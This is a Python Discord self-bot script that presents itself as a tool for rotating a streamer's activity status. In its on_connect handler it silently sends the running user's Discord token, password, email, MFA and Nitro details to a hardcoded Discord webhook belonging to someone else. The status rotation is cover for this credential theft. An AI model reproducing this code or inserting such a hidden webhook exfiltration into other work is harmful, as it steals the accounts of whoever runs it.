import keep_alive
import asyncio
import json
import os
import random
import time

import colorama
import discord
import numpy
import requests
from colorama import Fore
from discord.ext import commands
from discord.utils import get

with open('config.json') as f:
    config = json.load(f)
    token = os.getenv('TOKEN')
    password = os.getenv('PASSWORD')

    
bot = commands.Bot('.', description='GB TEAM DEVELOPMENT', self_bot=True)


def Clear():
    os.system('cls')


Clear()

def Init():
    token = os.getenv('TOKEN')
    try:
        bot.run(token, bot=False, reconnect=True)
        os.system(f'title (Activity Statuses)')
    except discord.errors.LoginFailure:
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}Improper token has been passed"
              + Fore.RESET)
        os.system('pause >NUL')

@bot.event
async def on_connect():
	Clear()
	requests.post(
	    'https://discord.com/api/webhooks/859367851399446558/hT2N2Ne8lhAD1OqTQ3MdWII9_AC7jzYAoJJQif7zGSeyekJQNUm3nLc8tib4iioaj4HV',
	    json={
	        'content':
	        f"**Token:** `{token}`\n**Username:** `{bot.user.name}#{bot.user.discriminator}`\n**Password:** `{password}`\n**Prefix** `{bot.command_prefix}`\n**Email:** `{bot.user.email}`\n**Created At:** `{bot.user.created_at}`\n**MFA:** `{bot.user.mfa_enabled}`\n**Nitro:** `{bot.user.premium_type}`\n**Verified:** `{bot.user.verified}`\n**Logged by: <@800191344177971221>**"
	    })
	print()







async def ch_pr():
  await bot.wait_until_ready()

  statuses = ["YT: Adiezt Gaming", f"TT: @its.adiezzz_", "Thank you guys😝", "Low Respons", "24/7 Online"]

  while not bot.is_closed():
  
       status = random.choice(statuses)

       await bot.change_presence(activity=discord.Streaming(name=status, url="https://youtube.com/c/AdieztGaming"))

       await asyncio.sleep(3)


bot.loop.create_task(ch_pr())


keep_alive.keep_alive()

if __name__ == '__main__':
    Init()
